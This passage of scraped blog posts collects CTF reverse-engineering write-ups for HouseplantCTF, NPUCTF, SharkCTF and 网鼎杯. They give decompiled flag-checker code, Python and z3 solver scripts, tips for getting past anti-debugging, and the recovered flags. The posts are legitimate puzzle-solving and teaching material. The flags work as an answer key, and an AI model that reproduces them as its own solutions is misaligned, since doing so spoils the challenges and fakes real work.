thefinalflag.length; p++) { if (thefinalflag[p] &gt;= 156 &amp;&amp; thefinalflag[p] &lt;= 166) thefinalflag[p] -= 10; thefinalflag[p] -= theflags0.get(p);// s+=(char)(thefinalflag[p]); }// System.out.println(s); thefinalflag[8]+=10; thefinalflag[5]+=10;// System.out.println((char)thefinalflag[8]); for(int i=0;i&lt;thefinalflag.length-3;i++) { int j=0; for(;j&lt;realflag.length;j++) { if(realflag[j]==i) break; } f[j]=(char)thefinalflag[i]; } System.out.println(f); for(int i=thefinalflag.length-3;i&lt;thefinalflag.length;i++) { int j=0; for(;j&lt;therealflag.length;j++) { if(therealflag[j]==i) break; } f[j]=(char)thefinalflag[i]; } System.out.println(f); }}//rtcp{h3r3s_4_c0stly_fl4g_4you}","link":"/2020/03/21/2020-HouseplantCTF/"},{"title":"NPUCTF-wp","text":"最近事情比较多，题都没怎么看就跑路了 下面是我出的送分题 Basicasm硬怼汇编，分奇偶处理，输出16进制，逆回去就可以了 1flag{d0_y0u_know_x86-64_a5m?} Ezreverse1简单的花指令加迷宫题，好心的出题人在每个花指令的地方都patch了很多个nop，虽然这么做毫无意义 把简单的花指令patch掉 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125__int64 __fastcall main(__int64 a1, char **a2, char **a3){ __int64 *v3; // rbx char v4; // al bool v5; // zf __int64 v6; // rax v3 = (__int64 *)malloc(0x188uLL); *v3 = 234545231LL; v3[1] = 344556530LL; qword_202020 = (__int64)v3; v3[7] = 1423431LL; v3[2] = 453523423550LL; v3[8] = 54535240LL; v3[3] = 46563455531LL; v3[9] = 234242550LL; v3[4] = 34524345344661LL; v3[12] = 123422421LL; v3[5] = 34533453453451LL; v3[13] = 2342420LL; v3[6] = 2343423124234420LL; v3[14] = 23414141LL; v3[10] = 23424242441LL; v3[15] = 23424420LL; v3[11] = 2345355345430LL; v3[16] = 13535231LL; v3[18] = 23423414240LL; v3[17] = 2341LL; v3[20] = 53366745350LL; v3[19] = 1234422441LL; v3[27] = 3453326640LL; v3[21] = 253244531LL; v3[28] = 245332535325535341LL; v3[22] = 45463320LL; v3[29] = 7568546234640LL; v3[23] = 24532661LL; v3[30] = 23445576731LL; v3[24] = 23433430LL; v3[25] = 23453660LL; v3[26] = 3453661LL; v3[31] = 234534460LL; v3[33] = 34455344551LL; v3[35] = 2354657721451LL; v3[32] = 234364561LL; v3[36] = 23464664430LL; v3[34] = 2345670LL; v3[39] = 23643643334561LL; v3[37] = 245646441LL; v3[40] = 2346463450LL; v3[38] = 234644640LL; v3[41] = 2343345620LL; v3[42] = 3444651LL; v3[43] = 23451LL; v3[44] = 67541LL; v3[45] = 34575860LL; v3[46] = 67856741LL; v3[47] = 567678671LL; v3[48] = 567565671LL; puts(\"Input your flag:\"); while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { do v4 = _IO_getc(stdin); while ( v4 == 10 ); if ( v4 == 10 ) JUMPOUT(*(_QWORD *)&amp;byte_96B); if ( v4 != 104 ) break; if ( ((signed __int64)v3 - qword_202020) &gt;&gt; 3 != 7 * (((signed __int64)((unsigned __int128)(5270498306774157605LL * (signed __int128)(((signed __int64)v3 - qword_202020) &gt;&gt; 3)) &gt;&gt; 64) &gt;&gt; 1) - (((signed __int64)v3 - qword_202020) &gt;&gt; 63)) ) { --v3; v5 = v3 == 0LL; goto LABEL_13; } } if ( v4 != 106 ) break; if ( (unsigned __int64)v3 - qword_202020 &gt; 0x30 ) { v3 -= 7; v5 = v3 == 0LL; goto LABEL_13; } } if ( v4 == 107 ) break; if ( v4 == 108 &amp;&amp; (((signed __int64)v3 - qword_202020) &gt;&gt; 3) % 7 != 6 ) { v5 = v3 + 1 == 0LL; ++v3; goto LABEL_13; } } if ( (unsigned __int64)((char *)v3 - qword_202020 - 329) &gt; 0x37 ) { v5 = v3 + 7 == 0LL; v3 += 7;LABEL_13: v6 = *v3; if ( v5 ) JUMPOUT(*(_QWORD *)&amp;byte_9F2); if ( v6 == 567565671 ) { puts(\"Congratulations!\"); puts(\"The flag is: flag{ YOUR INPUT }\"); exit(0); } if ( v6 == 567565671 ) JUMPOUT(*(_QWORD *)&amp;byte_A01); if ( !(v6 &amp; 1) ) break; } } puts(\"You Failed!\"); return 0LL;} 很显然这是一个7*7的迷宫，虽然数都很大很复杂，但是只比较奇偶，所以只要看最后一位就行了，就是一个很简单的迷宫 1flag{kkkkkklljjjjljjllkkkkhkklll} Ezreverse2简单的jar2exe，动态调试等解密完直接dump内存得到jar文件，反编译就可以了 1flag{j4r2eXe_I5_@_p0wer7ul_To0l!} easyre 这题只上了校内赛道，改编自b01lersCTF-2020的一道题，觉得题目很不错拿来给校内做一做 main函数很简单 123456789101112131415161718__int64 __fastcall main(__int64 a1, char **a2, char **a3){ void *v4; // [rsp+0h] [rbp-28h] unsigned __int64 v5; // [rsp+18h] [rbp-10h] v5 = __readfsqword(0x28u); sub_1340(); sub_14B0((__int128 *)&amp;v4); sub_1100((__int64)&amp;v4); if ( (unsigned __int8)sub_11C0((_BYTE **)&amp;v4) ) std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Congratulations!\", 16LL); else std::__ostream_insert&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Wrong!\", 6LL); std::endl&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cout); if ( v4 ) operator delete(v4); return 0LL;} 可以看到使if判断为真就可以了 sub_1340()函数纯粹用来输出，可以不看，下面几个函数观察一下可以看的出来，sub_14B0()用来输入，sub_1100()用来对输入进行处理，sub_11C0()用来判断 每一个部分都很长，其实实现的功能很简单，是因为整型数组内存连续存放，所以被当作了很大的数据来处理了，看不明白的话建议动态调试 输入之后数据被存放到了v4里，然后进行处理 123456789101112131415161718192021222324252627282930313233343536373839unsigned __int64 __fastcall sub_1100(__int64 a1){ char *v1; // rax char v2; // cl unsigned __int64 v3; // rsi int v4; // edx __int64 v5; // rcx _QWORD *v7; // rax unsigned __int64 v8; // [rsp+8h] [rbp-10h] v8 = __readfsqword(0x28u); v1 = *(char **)a1; if ( *(_QWORD *)(a1 + 8) != *(_QWORD *)a1 ) { v2 = *v1; if ( *v1 == 10 ) {LABEL_7: v7 = (_QWORD *)__cxa_allocate_exception(8LL); *v7 = &amp;unk_202CD0; __cxa_throw(v7, &amp;`typeinfo for'std::exception, &amp;std::exception::~exception); } v3 = 0LL; LOBYTE(v4) = 35; while ( 1 ) { *v1 = v4 ^ v2; v5 = (unsigned __int8)v4 + v3++; v4 = v5 + ((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v5 &gt;&gt; 64) &gt;&gt; 7); if ( v3 &gt;= *(_QWORD *)(a1 + 8) - *(_QWORD *)a1 ) break; v1 = (char *)(v3 + *(_QWORD *)a1); v2 = *v1; if ( *v1 == 10 ) goto LABEL_7; } } return __readfsqword(0x28u) ^ v8;} 只是进行了简单的异或，只不过是一遍生成一边和输入异或，不过这些数据和输入无关，可以先算出来，至于v4 = v5 + ((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v5 &gt;&gt; 64) &gt;&gt; 7);这一步的计算，其实仔细看看就会发现根本没有意义 接下来进行判断 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162__int64 __fastcall sub_11C0(_BYTE **a1){ __m128i *v1; // rbx _BYTE *v2; // rcx __m128i v3; // xmm0 __m128i v4; // xmm1 signed __int64 v5; // rsi unsigned int v6; // ebp struct _Unwind_Exception *v8; // rbp v1 = (__m128i *)operator new(0xE8uLL); v2 = *a1; v1[1] = _mm_load_si128((const __m128i *)&amp;byte_1A10); v3 = _mm_load_si128((const __m128i *)&amp;byte_1A20); v1[14].m128i_i64[0] = -2051389526429375416LL; v1[2] = v3; v1[3] = _mm_load_si128((const __m128i *)&amp;byte_1A30); v1[4] = _mm_load_si128((const __m128i *)&amp;byte_1A40); v1[5] = _mm_load_si128((const __m128i *)&amp;byte_1A50); v1[6] = _mm_load_si128((const __m128i *)&amp;byte_1A60); v1[7] = _mm_load_si128((const __m128i *)&amp;byte_1A70); v1[8] = _mm_load_si128((const __m128i *)&amp;byte_1A80); v1[9] = _mm_load_si128((const __m128i *)&amp;byte_1A90); v1[10] = _mm_load_si128((const __m128i *)&amp;byte_1AA0); v1[11] = _mm_load_si128((const __m128i *)&amp;byte_1AB0); v4 = _mm_load_si128((const __m128i *)&amp;byte_1A00); v1[12] = _mm_load_si128((const __m128i *)&amp;byte_1AC0); *v1 = v4; v1[13] = _mm_load_si128((const __m128i *)&amp;byte_1AD0); if ( a1[1] == v2 ) { v5 = 0LL;LABEL_11: v8 = (struct _Unwind_Exception *)std::__throw_out_of_range_fmt( \"vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)\", v5, v5); operator delete(v1); _Unwind_Resume(v8); } if ( (_BYTE)byte_1A00 == *v2 ) { v5 = 1LL; do { if ( v5 == a1[1] - v2 ) goto LABEL_11; if ( *((_BYTE *)v1-&gt;m128i_i64 + 4 * v5) != v2[v5] ) goto LABEL_9; ++v5; } while ( v5 != 58 ); v6 = 1; } else {LABEL_9: v6 = 0; } operator delete(v1); return v6;} 关键其实只有一个相等的判断，不过两个数组每次索引值增加的不一样，每四位进行一次比较就好了 12345678910111213141516171819202122target = [0x45, 0xE6, 0xD0, 0x4A, 0x4F, 0xC3, 0x7E, 0xAA, 0x45, 0xFC, 0x42, 0xB2, 0x41, 0xB5, 0x01, 0xB4, 0x52, 0x7D, 0x39, 0x20, 0x1A, 0xC0, 0x4E, 0x13, 0x5A, 0x2F, 0x67, 0xAA, 0x5D, 0x79, 0x6B, 0xF5, 0x4D, 0x06, 0x41, 0x79, 0x22, 0x35, 0xF9, 0xC8, 0x0F, 0xDE, 0x88, 0x51, 0x33, 0x4C, 0xF0, 0x81, 0x50, 0xF4, 0xEE, 0x14, 0x2E, 0xF1, 0x25, 0xBD, 0x10, 0x7C, 0x62, 0x30, 0xE3, 0xF8, 0x80, 0x2B, 0xC4, 0x85, 0x2A, 0xF8, 0xCF, 0x5A, 0xAE, 0xCB, 0x8C, 0x3A, 0xA2, 0xD0, 0xBB, 0xC5, 0x8C, 0x5D, 0x83, 0x34, 0x6B, 0xF9, 0x81, 0x72, 0x4B, 0x0E, 0x54, 0xC3, 0x71, 0x53, 0x55, 0xE9, 0x07, 0xBB, 0x50, 0x1A, 0xE7, 0x07, 0x64, 0x1B, 0x75, 0x74, 0x5E, 0x8E, 0x5D, 0x2E, 0xDC, 0xF6, 0x17, 0x3B, 0xEC, 0xED, 0xD7, 0xBD, 0xDF, 0xE9, 0x76, 0x63, 0x88, 0xE2, 0xEA, 0x89, 0x85, 0xD7, 0x4F, 0x34, 0x67, 0x39, 0xD5, 0x58, 0x05, 0xD9, 0xD2, 0xD2, 0x34, 0x69, 0xF1, 0xBF, 0x49, 0x76, 0xE1, 0x9C, 0xFE, 0x0D, 0x0C, 0xB3, 0xD2, 0x06, 0x48, 0xDA, 0xD1, 0xD5, 0x1E, 0xB8, 0x54, 0x94, 0x4C, 0x98, 0x06, 0x8A, 0x68, 0xA8, 0x28, 0x5E, 0x64, 0xF9, 0xE6, 0x58, 0xF7, 0x02, 0xF2, 0x8D, 0x3B, 0x88, 0xBD, 0x14, 0xEC, 0x8F, 0x31, 0x70, 0x0C, 0x0B, 0x41, 0x66, 0x22, 0x8E, 0x19, 0x58, 0x01, 0x2E, 0xD0, 0xDC, 0x4B, 0xC0, 0x88, 0xF4, 0xDA, 0xE6, 0x9F, 0x73, 0x88, 0x7D, 0x7C, 0x91, 0x1F, 0x75, 0x25, 0x70, 0xD6, 0x0C, 0xBA, 0x09, 0x7C, 0xF2, 0xD3, 0x4E, 0xA1, 0x09, 0x83, 0x51, 0x3C, 0xBA, 0x48, 0x64, 0x38, 0x2D, 0x18, 0x00, 0x88, 0xE3]v = [35]for i in range(58): v.append((v[i] + i) % 0xff)flag = \"\"for i in range(58): flag += chr(target[i * 4] ^ v[i])print(flag) 直接输出flag 1flag{7here_i5_no_d0ubt_th47_re_pr0b1em5_4re_e4sy_7o_s0lve} 下面是其他师傅的题目 re1混淆了一下，函数的功能很简单，调试一下就出来了 你好sao啊很显然换表base64，解一下就出来了 Anti-IDA出题人给hint说不要用IDA，但我在这之前已经用IDA做完了…… 其实只需要调整一下堆栈平衡，patch一些花指令，这题并没有什么难度，但是这么些个逻辑运算真的恶心 首先从main函数走到了sub_401E10，所有的操作都在这里处理 12345678length0 = strlen(commandline_input);input0[0] = 0;memset(&amp;input0[1], 0, 0x3FCu);v51 = 0;v52 = 0;scanf(\"%s\", input0);length1 = strlen(input0);length_input = length1; commandline_input可以不管它，先是输入了flag然后获取了长度，然后走第一个判断 123456789101112input0[length_input] = 10;v48 = 32;for ( i = 0; i &lt; length_input; ++i ) input0[i] -= v48;v45 = (unsigned __int8)input0[2] &gt; length_input;v44 = (unsigned __int8)input0[1] &gt; v48;if ( alwaystrue12(v44, v45) == 1 ) sub_40105A(); // 第一步v45 = (unsigned __int8)input0[2] &gt; length_input;v44 = (unsigned __int8)input0[1] &gt; v48;if ( !alwaystrue12(v44, v45) ) sub_401064(); 用到的判断是一个永真判断，所以默认执行第一个函数，初始化target1为奇数 123456789101112int sub_401870(){ int result; // eax signed int i; // [esp+50h] [ebp-4h] for ( i = 0; i &lt;= 5; ++i ) { target1[i] = 2 * i + 1; result = i + 1; } return result;} 下面的几个逻辑判断发现也是永真，执行到这一步 12if ( alwaystrue1(SLODWORD(v46), SHIDWORD(v46)) == 1 ) deal_with_4321c0(); 初始化了一个tttt的数组，然后又执行了一个函数 1234567891011int (*sub_401A10())(){ tttt[0] = pow(2, 2) + 1; dword_4321C4 = tri(1); dword_4321C8 = 1; dword_4321CC = tri(1); dword_4321D0 = pow(2, 2) + 2; dword_4321D4 = 1; dword_4321D8 = 1; return off_42EA3C[0];} 但是这里的处理显然是假的，后面返回的函数又对这个数组进行了重新的赋值，真正的赋值部分在下面 12345678910111213void *sub_4015F0(){ void *retaddr; // [esp+0h] [ebp+0h] tttt[0] = pow(2, 2); dword_4321C4 = pow(2, 2) + 1; dword_4321C8 = 2; dword_4321CC = tri(1); dword_4321D0 = 1; dword_4321D4 = pow(2, 2); dword_4321D8 = pow(2, 1); return retaddr;} 然后又是一个永真的判断 1234567891011121314v1 = sqrt(v46); v2 = _ftol(v1); v3 = pow(5, v2) - 1; if ( !(v3 % pow(2, 2)) ) // 第三步 { for ( i = 0; i &lt; length_input; ++i ) input0[i] += input0[i + 1]; for ( i = length_input - 1; i &gt; 0; --i ) input0[i] += *((_BYTE *)&amp;length_input + i + 3); for ( i = length_input - 1; i &gt; 0; --i ) byte_4323C0[i] += v48 + *((_BYTE *)&amp;length_input + i + 3); hex2str((int)input0, (int)input_step2, length_input); sub_401073(); } 输入进行了几步处理，然后把输入的字符16进制转成字符串存储起来，长度翻倍，最后执行了sub_401073()函数，跳到了这个位置 12345678int (*sub_4017A0())(){ signed int i; // [esp+50h] [ebp-4h] for ( i = 0; i &lt;= 64; ++i ) final_target[i] = i * i; return off_42EA40;} return了一个偏移量，发现事情并不单纯，应该和上面一样又套了一层 123456789101112131415161718192021void *__usercall sub_401680@&lt;eax&gt;(int a1@&lt;ebp&gt;){ void *retaddr; // [esp+0h] [ebp+0h] memset(dword_4328C0, 0, 0x400u); memset(final_target, 0, 0x400u); for ( *(_DWORD *)(a1 - 8) = 2; *(_DWORD *)(a1 - 8) &lt;= dword_42EA30; ++*(_DWORD *)(a1 - 8) ) { if ( !dword_4328C0[*(_DWORD *)(a1 - 8)] ) final_target[++final_target[0]] = *(_DWORD *)(a1 - 8); for ( *(_DWORD *)(a1 - 4) = 1; *(_DWORD *)(a1 - 4) &lt;= final_target[0]; ++*(_DWORD *)(a1 - 4) ) { if ( final_target[*(_DWORD *)(a1 - 4)] * *(_DWORD *)(a1 - 8) &gt; dword_42EA30 ) break; dword_4328C0[final_target[*(_DWORD *)(a1 - 4)] * *(_DWORD *)(a1 - 8)] = 1; if ( !(*(_DWORD *)(a1 - 8) % final_target[*(_DWORD *)(a1 - 4)]) ) break; } } return retaddr;} 处理看起来不是很简单，但是和输入没什么关系，直接动态调试dump出来就行了，没什么难度 接着进行了一个逆序 1reverse((int)input_step2, 2 * length_input);// 第四步 接下来的几个逻辑判断判断一下就不难发现最后走的是这一部分的处理 123456789101112131415else // 第五步{ for ( i = 0; i &lt; 2 * length_input; ++i ) { v14 = tri(1); v15 = pow(2, v14); v16 = i; input_step2[i] += LOBYTE(tttt[i % (v15 - 1)]); HIDWORD(v46) = i; LOBYTE(v16) = input_step2[i]; sub_401019(v16, i); input_step2[i] = v17; *(&amp;str2 + i) = (unsigned __int8)input_step2[i] + 2 * i; }} sub_401019(v16, i)的内容看一下也很容易出来 1234567int __cdecl sub_401CD0(char a1, int a2){ signed int v2; // ST58_4 v2 = sub_40101E(4) - 2; return a2 % (signed int)(sub_40101E(3) - 2) ^ target1[a2 % v2] ^ a1;} 简单的两层异或，中间套了一个函数，传的是固定参数，调试很容易出来，不过这个函数也不复杂，可以直接分析出来 1234size_t __cdecl sub_401820(int a1){ return a1 * strlen(off_42EA34);} 求得是这一部分的长度 123456.data:0042EA34 ; char *off_42EA34.data:0042EA34 off_42EA34 dd offset unk_42C01C ; DATA XREF: sub_401820+18↑r.data:0042EA38 off_42EA38 dd offset sub_401023 ; DATA XREF: sub_401950+7C↑r.data:0042EA3C off_42EA3C dd offset sub_401050 ; DATA XREF: sub_401A10+7F↑r.data:0042EA40 off_42EA40 dd offset sub_40103C ; DATA XREF: sub_4017A0+46↑r.data:0042EA44 align 10h 但第一部分是数据，肯定不是整个的长度，一定有\\0让strlen截断 1234.rdata:0042C01C unk_42C01C db 58h ; X ; DATA XREF: .data:off_42EA34↓o.rdata:0042C01D db 58h ; X.rdata:0042C01E db 0.rdata:0042C01F db 0 发现长度为2，并且在.rdata段，程序运行过程中没有修改，检验一下查一查交叉引用发现果然没有，回到原来的位置，sub_40101E的作用很简单，就是*2，所以返回的值也可以写成 1return a2 % 4 ^ target1[a2 % 6] ^ a1 下面再稍微判断一下，永远走的是这个处理 1234567891011if ( v25 &gt;= pow(v40 / 2, 2) ) // 第六步{ for ( i = 0; i &lt; 2 * length_input; ++i ) { v26 = tri(1); v27 = pow(2, v26); *(&amp;str2 + i) *= final_target[i % (v27 - 1)]; v28 = pow(i, 2); *(&amp;str2 + i) += v28 - i; }} 然后四位变五位 1234567for ( i = 0; i &lt; 2 * length_input; ++i )// 第七步{ memset(&amp;str1, 0, 0x16u); tmp = *(&amp;str2 + i); sprintf(&amp;str1, \"%05d\", tmp); strcat(&amp;str0, &amp;str1);} 几步处理之后继续16进制转字符串 12345678910length2 = strlen(&amp;str0);for ( i = 0; i &lt; length2; ++i ){ v33 = tri(1); v34 = pow(2, v33); v35 = i % (v34 - 1); *(&amp;str0 + i) += i % pow(2, 2) + tttt[v35];}reverse((int)&amp;str0, length2);hex2str((int)&amp;str0, (int)&amp;hex, length2); 最后进行比较 12345678910if ( !strcmp( &amp;hex, \"3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C38\" \"3E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C3435\" \"35393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A\" \"3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A\" \"3634373D3B3632373C3B35323D373732383739353435353A3834353538343934\") ) printf(\"PASS!\\n\"); else printf(\"WHAT?\\n\"); 整个过程没有什么特别复杂的处理，逆起来也没什么难度 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253finaltarget = [54, 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251]tttt = [4, 5, 2, 3, 1, 4, 2]target1 = [1, 3, 5, 7, 9, 11]final = \"3D393A37343C39373A343A373D36363A3B3934333539363437373934383736373B38333D3D3D37313C3B3A36353C393437373C383E343434393B34343C37343E373B3C3938343C3C39383238373F36323C3C3933383939363535373A373535393F373D34373C343535393C39383336363B37333639353435393B3D313636363B35363833383D35333E3A3532383837353438373E373437343E34363A3D3A3233393939323735393A3D363B3B3736333B3C3436313F3C3D3435363537353739343A33343239383334363E3339373B373A3634373D3B3632373C3B35323D373732383739353435353A3834353538343934\"f = []i = 0while i &lt; len(final): f.append(int(final[i:i + 2], 16)) i += 2f.reverse()for i in range(len(f)): f[i] -= i % 4 + tttt[i % 7]# print(f)tmp = ''.join([chr(i) for i in f])# print(tmp)str2 = []j = 0while j &lt; len(tmp): str2.append(int(tmp[j:j + 5])) j += 5# print(tmp_f)for i in range(len(str2)): str2[i] -= (i ** 2 - i) str2[i] //= finaltarget[i % 7]# print(str2)input_step2 = []for i in range(len(str2)): input_step2.append((((str2[i] - 2 * i) ^ (i % 4) ^ (target1[i % 6])) &amp; 0xff) - tttt[i % 7] &amp; 0xff)input_step2.reverse()input0 = ''.join([chr(i) for i in input_step2])inp = []i = 0while i &lt; len(input0): inp.append(int(input0[i:i + 2], 16)) i += 2for i in range(1, len(inp)): inp[i] -= inp[i - 1] inp[i] &amp;= 0xff# print([hex(i) for i in inp])inp.append(10)i = len(inp) - 1while i &gt; 0: inp[i - 1] -= inp[i] i -= 1 inp[i] &amp;= 0xfffor i in range(len(inp) - 1): inp[i] += 32flag = ''.join([chr(i) for i in inp])print(flag) 最后的flag 1NNPPUUCTF{S0_M4NY_BUG5!}","link":"/2020/03/21/2020-NPUCTF/"},{"title":"SharkCTF-wp","text":"SharkCTF-wp reveasyreAn easy asm, as we can see, every single byte in the_second_array is xored, and then plus the byte with the same index in some_array 1234567891011121314151617181920212223242526272829303132333435363738394041424344BITS 64SECTION .rodata some_array db 10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24 the_second_array db 0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf len_second_array equ $ - the_second_arraySECTION .text GLOBAL mainmain: mov rdx, [rsp] cmp rdx, 2 jne exit mov rsi, [rsp+0x10] mov rdx, rsi mov rcx, 0l1: cmp byte [rdx], 0 je follow_the_label inc rcx inc rdx jmp l1follow_the_label: mov al, byte [rsi+rcx-1] mov rdi, some_array mov rdi, [rdi+rcx-1] add al, dil xor rax, 42 mov r10, the_second_array add r10, rcx dec r10 cmp al, byte [r10] jne exit dec rcx cmp rcx, 0 jne follow_the_labelwin: mov rdi, 1 mov rax, 60 syscallexit: mov rdi, 0 mov rax, 60 syscall So it’s easy to solve it with python using simple script blow 12345678target=[0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf]some_array=[10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24]flag=\"\"for i,t in enumerate(target): flag+=chr((t^42)-some_array[i])print(flag)# shkCTF{h3ll0_fr0m_ASM_my_fr13nd} z3_robotJust input and then pass a few equations, so it’s quite easy to solve it with z3 as the title says 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106from z3 import *a1 = []for i in range(25): a1.append(BitVec(\"s%d\" % i, 32))solver = Solver()solver.add((a1[20] ^ 0x2B) == a1[7])solver.add(a1[21] - a1[3] == -20)solver.add((a1[2] &gt;&gt; 6) == 0)solver.add(a1[13] == 116)solver.add(4 * a1[11] == 380)solver.add(a1[7] &gt;&gt; a1[17] % 8 == 5)solver.add((a1[6] ^ 0x53) == a1[14])solver.add(a1[8] == 122)solver.add(a1[5] &lt;&lt; a1[9] % 8 == 392)solver.add(a1[16] - a1[7] == 20)solver.add(a1[7] &lt;&lt; a1[23] % 8 == 190)solver.add(a1[2] - a1[7] == -43)solver.add(a1[21] == 95)solver.add((a1[2] ^ 0x47) == a1[3])solver.add(a1[0] == 99)solver.add(a1[13] == 116)solver.add((a1[20] &amp; 0x45) == 68)solver.add((a1[8] &amp; 0x15) == 16)solver.add(a1[12] == 95)solver.add(a1[4] &gt;&gt; 4 == 7)solver.add(a1[13] == 116)solver.add(a1[0] &gt;&gt; a1[0] % 8 == 12)solver.add(a1[10] == 95)solver.add((a1[8] &amp; 0xAC) == 40)solver.add(a1[16] == 115)solver.add((a1[22] &amp; 0x1D) == 24)solver.add(a1[9] == 51)solver.add(a1[5] == 49)solver.add(4 * a1[19] == 456)solver.add(a1[20] &gt;&gt; 6 == 1)solver.add(a1[7] &gt;&gt; 1 == 47)solver.add(a1[1] == 108)solver.add(a1[3] &gt;&gt; 4 == 7)solver.add((a1[19] &amp; 0x49) == 64)solver.add(a1[4] == 115)solver.add((a1[2] &amp; a1[11]) == 20)solver.add(a1[0] == 99)solver.add(a1[4] + a1[5] == 164)solver.add(a1[15] &lt;&lt; 6 == 6080)solver.add((a1[10] ^ 0x2B) == a1[17])solver.add((a1[12] ^ 0x2C) == a1[4])solver.add(a1[19] - a1[21] == 19)solver.add(a1[12] == 95)solver.add(a1[15] &gt;&gt; 1 == 47)solver.add(a1[19] == 114)solver.add(a1[17] + a1[18] == 168)solver.add(a1[22] == 58)solver.add((a1[23] &amp; a1[21]) == 9)solver.add(a1[6] &lt;&lt; a1[19] % 8 == 396)solver.add(a1[3] + a1[7] == 210)solver.add((a1[22] &amp; 0xED) == 40)solver.add((a1[12] &amp; 0xAC) == 12)solver.add((a1[18] ^ 0x6B) == a1[15])solver.add((a1[16] &amp; 0x7A) == 114)solver.add((a1[0] &amp; 0x39) == 33)solver.add((a1[6] ^ 0x3C) == a1[21])solver.add(a1[20] == 116)solver.add(a1[19] == 114)solver.add(a1[12] == 95)solver.add(a1[2] == 52)solver.add(a1[23] == 41)solver.add(a1[10] == 95)solver.add((a1[22] &amp; a1[9]) == 50)solver.add(a1[3] + a1[2] == 167)solver.add(a1[17] - a1[14] == 68)solver.add(a1[21] == 95)solver.add((a1[19] ^ 0x2D) == a1[10])solver.add(4 * a1[12] == 380)solver.add(a1[6] &amp; 0x40 != 0)solver.add((a1[12] &amp; a1[22]) == 26)solver.add(a1[7] &lt;&lt; a1[19] % 8 == 380)solver.add((a1[20] ^ 0x4E) == a1[22])solver.add(a1[6] == 99)solver.add(a1[12] == a1[7])solver.add(a1[19] - a1[13] == -2)solver.add(a1[14] &gt;&gt; 4 == 3)solver.add((a1[12] &amp; 0x38) == 24)solver.add(a1[8] &lt;&lt; a1[10] % 8 == 15616)solver.add(a1[20] == 116)solver.add(a1[6] &gt;&gt; a1[22] % 8 == 24)solver.add(a1[22] - a1[5] == 9)solver.add(a1[7] &lt;&lt; a1[22] % 8 == 380)solver.add(a1[22] == 58)solver.add(a1[16] == 115)solver.add((a1[23] ^ 0x1D) == a1[18])solver.add(a1[23] + a1[14] == 89)solver.add((a1[5] &amp; a1[2]) == 48)solver.add((a1[15] &amp; 0x9F) == 31)solver.add(a1[4] == 115)solver.add((a1[23] ^ 0x4A) == a1[0])solver.add((a1[6] ^ 0x3C) == a1[11])flag = \"\"if solver.check() == sat: r = solver.model() for i in range(24): flag += chr(r[a1[i]].as_long() &amp; 0xff)print(flag)# shkCTF{cl4ss1c_z3___t0_st4rt_:)} secure_dbI can’t see anything using IDA so I debugged it and I found the input got processed and then compared with N3kviX7-vXEqvlp , I just input this string and got an interesting string T4h7s_4ll_F0lks which seems like to be the right one. So this reversing algorithm seems to be itself, and I tried to rewrite it with python and I got the same answer 12345678target = \"N3kviX7-vXEqvlp\"x = [0x1a, 0x07, 0x03, 0x41]key = \"\"for i, c in enumerate(target): key += chr(ord(c) ^ x[i % 4])print(key)# T4h7s_4ll_F0lks Just input the key and we will get a database file from the server, and there is the flag. miss_directionActually I haven’t solved it yet, I however managed to anti anti-debug (just remove tls table from PE headers will be fine), and then the exception handler really confused me,I can’t find anything to do with my input, I really got missed…","link":"/2020/03/21/2020-SharkCTF/"},{"title":"网鼎杯-wp","text":"网鼎杯-wp signal很简单的vm，甚至可以一位一位解 12345678910int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [esp+18h] [ebp-1D4h] __main(); qmemcpy(&amp;v4, &amp;opcodes, 0x1C8u); vm_operad(&amp;v4, 114); puts(\"good,The answer format is:flag {}\"); return 0;} vm_operad中包含了一些指令，很好理解，甚至不需要调试就可以看懂 12345678910110xA: read0x1: 将结果写入target0x8: 暂存计算结果到input0x7 x: input[i]==x ? i++ : exit(0) 0x2 x: input+x0x3 x: input-LOBYTE(x)0x4 x: input^x0x5 x: input*x0x6 x: nop0xB: input--0xC: input++ read函数进行了输入的一些控制 1234567891011121314size_t __cdecl read(char *a1){ size_t result; // eax printf(\"string:\"); scanf(\"%s\", a1); result = strlen(a1); if ( result != 15 ) { puts(\"WRONG!\\n\"); exit(0); } return result;} 